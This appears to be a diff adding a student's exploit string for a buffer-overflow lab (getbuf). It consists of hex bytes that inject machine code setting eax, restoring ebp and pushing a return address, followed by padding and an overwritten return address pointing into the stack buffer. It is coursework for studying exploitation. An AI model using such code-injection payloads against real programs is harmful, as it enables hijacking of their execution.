@@ -1,0 +1,13 @@
+/* getbuf() return address : 0x556830e4 */
+/* loacal buffer start at : 0x556830b8 */
+/* fix the code */
+b8 02 9a 3a 58  /* mov $0x583a9a02, %eax */
+bd 10 31 68 55  /* fixed ebp */
+68 81 8e 04 08  /* push 0x8048e81 */
+c3  /* ret */
+00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* my function located at : 0x556830b8 */
+b8 30 68 55
+
